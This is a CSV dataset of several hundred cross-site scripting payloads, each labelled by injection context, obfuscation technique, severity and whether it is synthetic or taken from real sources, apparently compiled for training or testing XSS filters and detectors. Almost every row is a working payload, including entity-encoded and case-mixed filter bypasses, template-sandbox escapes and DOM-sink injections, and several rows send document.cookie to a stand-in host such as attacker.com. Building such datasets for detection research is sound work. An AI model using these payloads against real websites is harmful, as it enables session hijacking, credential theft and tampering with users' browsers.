payload,context,technique,severity,length,source
{% alert document.cookie %},template_injection,synthetic,high,27,synthetic
\' OnpAusE=cOnsOle.loG('XSS')//,attribute_escape,synthetic,medium,31,synthetic
"""><&#97;udio onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,60,synthetic
%27 oncopy=prompt(document.domain) %27,attribute_escape,synthetic,medium,38,synthetic
\' onpoint&#101;rmov&#101;=prompt('XSS')//,attribute_escape,synthetic,medium,42,synthetic
"<t&#97;bl&#101;
ons&#101;l&#101;ct=prompt(1)>",tag_injection,synthetic,medium,45,synthetic
'><img src=x onhashchange=alert('XSS')>,attribute_escape,synthetic,medium,39,synthetic
onmozfullscreenchange=prompt&#40;1&#41;,event_handler,synthetic,low,39,synthetic
"<dir onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</dir>",tag_injection,none,medium,64,real
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,tag_injection,none,medium,68,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(1)>"")",dom_sink,synthetic,medium,62,synthetic
<foRm/OnwEbkIttRanSitIonEnd=prOmpT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,50,synthetic
"""%3E%3Cdiv onpause=confirm(location.hash)%3E",tag_injection,synthetic,medium,44,synthetic
""" onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,low,65,synthetic
"document.body.innerHTML=""<img src=x onerror=eval(document.domain)>""",dom_sink,synthetic,high,67,synthetic
"document.querySelector(""body"").innerHTML+=""fetch('XSS')""",dom_sink,synthetic,high,56,synthetic
"<small oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,tag_injection,none,medium,61,real
onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(1),event_handler,synthetic,low,49,synthetic
"<applet onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",tag_injection,none,medium,73,real
"""><AreA oNclOse=prOmpT(1)>",tag_injection,synthetic,medium,26,synthetic
<tr onTogGle=coNsoLe.Log(doCumEnt.doMaiN) OntOggLe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,80,synthetic
"<col onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</col>",tag_injection,none,medium,65,real
'><Img srC=x onCut=alErt('XSS')>,attribute_escape,synthetic,medium,32,synthetic
	onpopstate=confirm(%27XSS%27),event_handler,synthetic,medium,30,synthetic
"<style>:target {color: red;}</style><mark id=x style=""transition:color 10s"" ontransitioncancel=print()></mark>",tag_injection,none,low,110,real
"<content onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,71,real
&quot; onended=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,37,synthetic
""" ><svg onpopstate=\u0061lert(1)>",attribute_escape,synthetic,low,33,synthetic
location.href=%22javascript:alert(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink,synthetic,high,78,synthetic
onfocusout=javascript:confirm(%27XSS%27),event_handler,synthetic,medium,40,synthetic
""" ><svG oNanImaTioNenD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
`><Img srC=x onPauSe=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,40,synthetic
"<dfn onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",tag_injection,none,medium,65,real
' ><svg onanimationcancel=confirm(location.hash)>,attribute_escape,synthetic,medium,49,synthetic
#{prompt('XSS')},template_injection,synthetic,medium,16,synthetic
onsubmit=confirm(1),event_handler,synthetic,medium,19,synthetic
"document.write(""%3Cimg src=x onerror=console.log(String.fromCharCode(88,83,83))%3E"")",dom_sink,synthetic,high,84,synthetic
__proto__[%22ontouchend%22]=confirm(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,77,synthetic
"<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>",tag_injection,encoding,high,145,real
&quot; ontoggle=alert(document.domain) x=&quot;,attribute_escape,synthetic,medium,47,synthetic
	ondragover=confirm(1),event_handler,synthetic,medium,22,synthetic
\' onanimationend=confirm(1)//,attribute_escape,synthetic,medium,30,synthetic
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onwebkitanimationend=""alert(1)""></abbr>",tag_injection,none,medium,99,real
"<span onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</span>",tag_injection,none,medium,70,real
<liNk OnwAitIng=coNfiRm(1)>,tag_injection,synthetic,medium,27,synthetic
"<hgroup draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",tag_injection,none,medium,90,real
eval(%22alert(btoa(document.cookie))%22),dom_sink,synthetic,high,40,synthetic
"<col draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</col>",tag_injection,none,medium,84,real
<xss onk&#101;ypr&#101;ss=consol&#101;.log(1) onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,87,synthetic
"<IMG SRC=""jav&#x0D;ascript:alert('AnonKryptiQuz');"">",attribute_escape,html_entity|whitespace_obfuscation|case_variation,medium,52,real
"<img/id=""alert&lpar;&#x27;XSS&#x27;&#x29;\""/alt=\""/\""src=\""/\""onerror=eval(id&#x29;>",dom_sink,html_entity|encoding,low,84,real
<ifr&#97;m&#101; x=y oninput=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,69,synthetic
<svg/onload=location=/javas/.source%2B/cript:/.source%2B,dom_sink,url_encoding,high,56,real
"<slot id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></slot>",tag_injection,none,medium,84,real
"eval(""fetch(btoa(document.cookie))"")",dom_sink,synthetic,high,36,synthetic
<source oninput=alert(location.hash)>,tag_injection,synthetic,medium,37,synthetic
"%22><marquee onclose=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,60,synthetic
"<style>:target {color: red;}</style><basefont id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></basefont>",tag_injection,none,medium,119,real
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.CooKie)""",dom_sink,synthetic,high,50,synthetic
"<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[""'`-->]]>]</div>",tag_injection,url_encoding,medium,114,real
"' ><svg onanimationend=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
\' onmousedown=\u0061lert(location.hash)//,attribute_escape,synthetic,low,42,synthetic
<svg><canvas onload=alert(1)></canvas>,tag_injection,none,medium,38,real
&quot; ontoggle=prompt(1) x=&quot;,attribute_escape,synthetic,medium,34,synthetic
"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",script_injection,none,medium,95,real
onwheel=console.log&#40;document.domain&#41;,event_handler,synthetic,low,44,synthetic
"eval(""fetch(location.hash)"")",dom_sink,synthetic,high,28,synthetic
"<title
onstalled=alert(%27XSS%27)>",tag_injection,synthetic,medium,34,synthetic
\%27 onpagereveal=console.log(document.domain)//,attribute_escape,synthetic,medium,48,synthetic
"""><Img srC=x onCopY=cOnfIrm('XSS')>",attribute_escape,synthetic,medium,35,synthetic
'><img src=x ondragenter=console.log(1)>,attribute_escape,synthetic,medium,40,synthetic
<video onclick=console.log('XSS')/>,tag_injection,synthetic,medium,35,synthetic
<li onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</li><input value=clickme>,tag_injection,none,medium,104,real
"<noscript ondblclick=""alert(1)"">AnonKryptiQuz</noscript>",tag_injection,none,medium,56,real
<sp&#97;n x=y ons&#101;curitypolicyviol&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,87,synthetic
%3CSCRIPT%3Eprompt(1)%3C/SCRIPT%3E,script_injection,synthetic,medium,34,synthetic
"element.setAttribute(%22onclick%22,%22prompt(document.cookie+%27&loc=%27+location.href)%22)",dom_sink,synthetic,high,91,synthetic
OnbEfoRecOpy=alErt(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
location.href=%22javascript:confirm(document.cookie+%27&loc=%27+location.href)%22,dom_sink,synthetic,high,81,synthetic
'><img src=x onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,88,synthetic
"<head onmousemove=""alert(1)"">AnonKryptiQuz</head>",tag_injection,none,medium,49,real
OnsCroLlsNapChaNge=coNfiRm&#40;'XSS'&#41;,event_handler,synthetic,low,41,synthetic
 onEnd=prOmpT(1),event_handler,synthetic,medium,16,synthetic
'%3E%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,synthetic,medium,39,synthetic
"document.querySelector(""body"").innerHTML+=""\u0061lert('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,92,synthetic
"<rb draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</rb>",tag_injection,none,medium,62,real
"<template draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</template>",tag_injection,none,medium,89,real
"<img src=""x:%90"" title=""onerror=alert(1)//"">",tag_injection,url_encoding,medium,44,real
"""><img src=x onmouseup=prompt(document.domain)>",attribute_escape,synthetic,medium,47,synthetic
<boDy OnbEfoRecUt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,43,synthetic
"<table onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,63,real
"<script>confirm`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection,synthetic,low,64,synthetic
"<a onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</a>",tag_injection,none,medium,61,real
"%3Cscript%3Eprompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,62,synthetic
onbeforetoggle=prompt/*x*/('XSS'),event_handler,synthetic,low,33,synthetic
<scr	ipt>Function('prompt(location.hash)')();</scr	ipt>,script_injection,synthetic,medium,55,synthetic
"%22 ><svg onbeforetoggle=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,62,synthetic
""" oNclOse=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,54,synthetic
"%27 onload=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,51,synthetic
%3Cvideo src=x onmozfullscreenchange=prompt('XSS')%3E,tag_injection,synthetic,medium,53,synthetic
"<base onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</base>",tag_injection,none,medium,61,real
"<dl onclick=""alert(1)"">AnonKryptiQuz</dl>",tag_injection,none,medium,41,real
"""`'><script>\x0Ajavascript:alert(1)</script>",script_injection,none,medium,44,real
' %3E%3Csvg oncanplay=console.log(location.hash)%3E,attribute_escape,synthetic,medium,51,synthetic
"<meter onmouseover=""alert(1)"">AnonKryptiQuz</meter>",tag_injection,none,medium,51,real
<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie),dom_sink,url_encoding,high,110,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""confirm(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""",dom_sink,synthetic,medium,134,synthetic
"<h1 onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</h1>",tag_injection,none,medium,57,real
"""%3E%3Cvideo onpaste=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,60,synthetic
<!--><plaintext onrepeat=prompt('XSS')>,tag_injection,synthetic,medium,39,synthetic
"<hr onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",tag_injection,none,medium,65,real
' onbeforetoggle=console.log('XSS') ',attribute_escape,synthetic,medium,37,synthetic
<%= prompt(%27XSS%27) %>,template_injection,synthetic,medium,24,synthetic
 onhashchange=console.log(location.hash),event_handler,synthetic,medium,40,synthetic
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,tag_injection,none,medium,60,real
ontr&#97;nsitionst&#97;rt=consol&#101;.log/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,70,synthetic
<form x=y onreset=console.log(document.domain)>,tag_injection,synthetic,medium,47,synthetic
%3C!--%3E%3Cset onend=alert(1)%3E,tag_injection,synthetic,medium,33,synthetic
"<ins draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",tag_injection,none,medium,79,real
"<plaintext onpause=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,62,synthetic
"""><dialog onplay=prompt(document.domain)>",tag_injection,synthetic,medium,41,synthetic
%22 ><svg onbeforecut=alert(document.domain)>,attribute_escape,synthetic,medium,45,synthetic
&quot; onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape,synthetic,low,66,synthetic
<embed	onmozfullscreenchange=console.log(document.domain)>,tag_injection,synthetic,medium,58,synthetic
"<map draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</map>",tag_injection,none,medium,84,real
onpointerover=javascr	ipt:prompt(document.domain),event_handler,synthetic,medium,49,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""print()""></menu>",tag_injection,none,low,177,real
<details onrepeat=prompt(1)/>,tag_injection,synthetic,medium,29,synthetic
<!--><xss ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,48,synthetic
"<header draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</header>",tag_injection,none,medium,70,real
<listing onpointerrawupdate=\u0061lert('XSS')/>,tag_injection,synthetic,low,47,synthetic
JavAscRipT:vOid(prOmpT(lOcaTioN.hAsh)),js_uri,synthetic,medium,38,synthetic
"<template onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</template>",tag_injection,none,medium,76,real
<span src=x oncopy=prompt(location.hash)>,tag_injection,synthetic,medium,41,synthetic
<audio	onscrollend=prompt(location.hash)>,tag_injection,synthetic,medium,41,synthetic
\' ontoggle=console.log(1)//,attribute_escape,synthetic,medium,28,synthetic
"{{c='%27%27.sub.call;b='%27%27.sub.bind;a='%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync('prompt(""Enter something:"", document.domain)');m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a='%27%27.sub;$eval('a(b.c)'):[].push.apply=a:}}",template_injection,encoding|url_encoding,medium,412,real
&quot; onend=\u0061lert('XSS') x=&quot;,attribute_escape,synthetic,low,39,synthetic
'%3E%3Cimg src=x onreset=alert('XSS')%3E,attribute_escape,synthetic,medium,40,synthetic
'});alert(document.cookie);//',dom_sink,none,high,30,real
%22><img src=x ontouchstart=console.log(document.domain)>,attribute_escape,synthetic,medium,57,synthetic
%27><img src=x onwebkittransitionend=confirm(location.hash)>,attribute_escape,synthetic,medium,60,synthetic
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=print()></shadow>",tag_injection,none,low,129,real
"onpagereveal=javascr	ipt:confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
 onscrollend=confirm(1),event_handler,synthetic,medium,23,synthetic
"<rt onmouseover=""alert(1)"">AnonKryptiQuz</rt>",tag_injection,none,medium,45,real
%3C!--%3E%3Cmarquee onscrollsnapchange=prompt(1)%3E,tag_injection,synthetic,medium,51,synthetic
<boDy X=y onInvAliD=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"<img \x47src=x onerror=""javascript:alert(1)"">",js_uri,none,medium,45,real
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></data>",tag_injection,none,medium,168,real
'><img src=x ons&#101;&#97;rch=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,61,synthetic
"""><img src=x ons&#101;l&#101;ct=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,low,72,synthetic
"<sub onclick=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",tag_injection,none,medium,63,real
""" ong&#101;stur&#101;&#101;nd=prompt(1) """,attribute_escape,synthetic,medium,41,synthetic
 onk&#101;ypr&#101;ss=consol&#101;.log(1),event_handler,synthetic,low,41,synthetic
"<frameset oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",tag_injection,none,medium,68,real
"onfocusout=prompt/***/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,53,synthetic
"<strong onmousedown=""alert(1)"">AnonKryptiQuz</strong>",tag_injection,none,medium,53,real
%3Cbody onpointermove=alert(location.hash)/%3E,tag_injection,synthetic,medium,46,synthetic
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></thead>",tag_injection,none,medium,113,real
""" ><svG oNgoTpoIntErcAptUre=prOmpT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
<center onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68,real
""" %3E%3Csvg onplaying=alert(location.hash)%3E",attribute_escape,synthetic,medium,45,synthetic
"\%27 onreset=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,57,synthetic
"location.href=""javascr	ipt:prompt('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,72,synthetic
JavAscRipT:pRomPt(1),js_uri,synthetic,medium,20,synthetic
"__proto__[""onb&#101;for&#101;input""]=consol&#101;.log('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,114,synthetic
&quot; onanimationend=confirm(location.hash) x=&quot;,attribute_escape,synthetic,medium,53,synthetic
{{_toDisplayString.constructor('alert(1)')()}},template_injection,none,medium,46,real
j&#97;v&#97;script:consol&#101;.log/*x*/(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,63,synthetic
"__proto__[""onpromptdismiss""]=alert(location.hash)",dom_sink,synthetic,medium,49,synthetic
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",attribute_escape,case_variation,medium,51,real
' ><svg onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,55,synthetic
`><img src=x ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,73,synthetic
""" onmous&#101;wh&#101;&#101;l=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,64,synthetic
"<dialog onmousedown=""alert(1)"">AnonKryptiQuz</dialog>",tag_injection,none,medium,53,real
"<style draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</style>",tag_injection,none,medium,68,real
